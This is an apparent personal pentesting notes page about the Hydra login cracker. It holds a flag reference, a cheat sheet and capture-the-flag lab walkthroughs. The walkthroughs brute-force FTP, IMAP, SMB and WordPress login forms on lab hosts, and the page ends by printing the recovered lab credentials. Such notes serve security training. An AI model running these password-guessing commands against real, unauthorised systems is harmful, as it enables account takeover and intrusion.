<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>hydra</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>hydra</h1><br/><strong>Password Bruteforce</strong><br /><br />Hydra is a┬áparallelized, fast and flexible login cracker.<br /><br />hydra -l username -P wordlist.txt server service<br /><br />-l : Username static<br />or<br />-L: Username wordlist<br /><br />-p: Password static<br />or<br />-P: Password wordlist<br /><br /><br />server: It is the hostname or IP address of the target server.<br />service: It indicates the service which you are trying to launch the dictionary attack<br /><br />-s PORT : To specify “non default” port number<br />-v	: Verbose<br />-vv : Very Verbose<br />-t N : Where N is the number of parallel connections to the target. eg. -t 16<br />-d : Debugging information<br /><br />Note: -l ------&gt; Lowercase L<br /><br />Eg. hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.117.110 ftp<br />or<br />hydra -l mark -P /usr/share/wordlists/rockyou.txt <a href="ftp://10.10.117.110">ftp://10.10.117.110</a><br /><br /><br /><strong>Live Example:</strong><br /><em>hydra -l lazie -P /usr/share/wordlists/rockyou.txt -vv 10.10.117.110 imap</em><br /><br /><strong>Login Page (POST Method) Example:</strong><br /><em>hydra -l &lt;username&gt; -P /usr/share/wordlists/&lt;wordlist&gt; &lt;ip&gt; http-post-form “Login URL excluding IP:Post method from Burp with cookie:Message”</em><br /><br />eg.<br />hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.229.129 http-post-form &quot;/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=75frL29Jq77UAS5O6waIAgvpqUOtcagLXmAs8ntJGK3DU6IXmkigWCYXlctGEb2O2G%2BjF5IteFOYg9pWj2Mqq0iJxVrJkUODXhUuOJ8sbmce0tBELKmw72s8I9JOUKGp6Z87DHYCwVZSIB1k8QZzxc%2BDfuwsKdSogudxveYfMl9Xl9WN&amp;__EVENTVALIDATION=kEqTpl3NK636vrrQoIGLwaBPeMNLrYgB5eLO2J3lhWCriHgdsDifHhxinhhtmfiV8p%2Fdx0IPiK0B5uO5gDR8tsJcKtQEVnqRqGuba%2BcImoxZrFAdTL%2FfNB4nBipBifGFewi7YAqZ8JhkThaZTfMnUpVOTH8tU0jzP03GuC7bHCt9G9K1&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed&quot; -vv<br /><br /><strong>Explanation</strong><br />-l --→ admin <strong>(Username)</strong><br />-P --→ /usr/share/wordlists/rockyou.txt <strong>(Password File)</strong><br />10.10.229.129 --→ <strong>(URL to attack)</strong><br />http-post-form --→ <strong>(Type of service)</strong><br />/Account/login.aspx?ReturnURL=/admin/ --→ <strong>(Variable Argument 1st field)</strong><br />__VIEWSTATE=75frL29Jq77UAS5O6waIAgvpqUOtcagLXmAs8ntJGK3DU6IXmkigWCYXlctGEb2O2G%2BjF5IteFOYg9pWj2Mqq0iJxVrJkUODXhUuOJ8sbmce0tBELKmw72s8I9JOUKGp6Z87DHYCwVZSIB1k8QZzxc%2BDfuwsKdSogudxveYfMl9Xl9WN&amp;__EVENTVALIDATION=kEqTpl3NK636vrrQoIGLwaBPeMNLrYgB5eLO2J3lhWCriHgdsDifHhxinhhtmfiV8p%2Fdx0IPiK0B5uO5gDR8tsJcKtQEVnqRqGuba%2BcImoxZrFAdTL%2FfNB4nBipBifGFewi7YAqZ8JhkThaZTfMnUpVOTH8tU0jzP03GuC7bHCt9G9K1&amp;ctl00%24MainContent%24LoginUser%24UserName=<em><strong>^USER^</strong></em>&amp;ctl00%24MainContent%24LoginUser%24Password=<em><strong>^PASS^</strong></em>&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in --→ <strong>(Variable Argument 2nd field)</strong><br />Login failed --→ <strong>(Variable Argument 3rd field)</strong><br />-vv --→ Verbose mode<br /><br /><br /><strong>Note: Variable Arguments should be contained in quoatations and have 3 values seprated by “:”</strong> <strong>(All 3 Mandatory)</strong><br />Value 1 - Login URL excluding IP <em>[Can be easily recieved from Burpsuite]</em><br />Value 2 - Post Request with cookie information <em>[Can be easily recieved from Burpsuite]</em><br />Value 3 - The error message we get from a failed login [<em>Can be found on the web page after giving dummy</em>].<br /><br /><strong>Note:</strong><br />In the Post request remove the username and password we provided in burp with <strong>^USER^</strong> and <strong>^PASS^</strong><br /><br /><strong>Example Output:</strong><br /><br /><br /><a href=""><img src="images/83-1.png" alt="images/83-1.png" /></a><br /><br /><strong><h3>Hydra Cheatsheet:</h3></strong><br /><br /><table class="table"><tr><th>Command</th><th>Description</th></tr><tr><td>hydra -P &lt;wordlist&gt; -v &lt;ip&gt; &lt;protocol&gt;</td><td>Brute force against a protocol of your choice</td></tr><tr><td>hydra -v -V -u -L &lt;username list&gt; -P &lt;password list&gt; -t 1 -u &lt;ip&gt; &lt;protocol&gt;</td><td>You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)</td></tr><tr><td>hydra -t 1 -V -f -l &lt;username&gt; -P &lt;wordlist&gt; rdp://&lt;ip&gt;</td><td>Attack a Windows Remote Desktop with a password list.</td></tr><tr><td>hydra -l &lt;username&gt; -P .&lt;password list&gt; $ip -V http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;</td><td>Craft a more specific request for Hydra to brute force.</td></tr></table><br /><br /><br /><strong><h3>Samba Example (Did not have sucess)</h3></strong><br /><br />hydra -l milesdyson -P log1.txt 10.10.68.116 smb<br /><br /><a href=""><img src="images/83-2.png" alt="images/83-2.png" /></a><br /><br /><br /><strong><h3>Samba Example Post Form</h3></strong><br /><br />hydra -l milesdyson -P log1.txt 10.10.68.116 http-post-form &quot;/squirrelmail/src/redirect.php:login_username=^USER^&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:Unknown user or password incorrect.&quot; -vv<br /><br /><a href=""><img src="images/83-3.png" alt="images/83-3.png" /></a><br /><br /><br /><strong><h3>HTTP Post Brute-Force Example with Wordpress Login:</h3></strong><br /><br />We will use <strong>hydra</strong> and <strong>dictionary file</strong> recieved to find out both <strong>username</strong> and <strong>password</strong>.<br /><br />We capture the post request with burpsuite and collect the three important parameters.<br /><br />1. Post Requester<br />2. Post Request<br />3. Error Message<br /><br /><strong>We get 1 and 2 below</strong><br /><a href=""><img src="images/83-4.png" alt="images/83-4.png" /></a><br /><strong>We get 3 below</strong><br /><a href=""><img src="images/83-5.png" alt="images/83-5.png" /></a><br /><br /><strong>Hydra Code for finding out Username:</strong><br /><br /><em><strong>hydra -L /home/cybex/lab/thm/MrRobotCTF/fsocity.dic -p test -s 80 10.10.7.69 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.10.7.69%2Fwp-admin%2F&amp;testcookie=1:Invalid username&quot; -vv -t 64</strong></em><br /><br /><a href=""><img src="images/83-6.png" alt="images/83-6.png" /></a><br /><br />We found that <strong>Elliot</strong> is a valid username. This can be confirmed by using the above credentials in wordpress login. We will get a different error message.<br /><br /><a href=""><img src="images/83-7.png" alt="images/83-7.png" /></a><br /><br /><br /><br />keeping the 1 and 2 parameters same. We change the 3 parameter to the above error and following is the hydra code for password brute-force with Elliot as user.<br /><br /><strong>Hydra Code for finding out Password:</strong><br /><br /><em><strong>hydra -l Elliot -P /home/cybex/lab/thm/MrRobotCTF/fsocity.dic -s 80 10.10.7.69 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.10.7.69%2Fwp-admin%2F&amp;testcookie=1:The password you entered for the username&quot; -vv -t 64</strong></em><br /><br /><a href=""><img src="images/83-8.png" alt="images/83-8.png" /></a><br /><br /><br /><strong>Thus, we get the wordpress credentials:<br />Username: Elliot<br />Password: ER28-0652</strong></div>
</body>
</html>
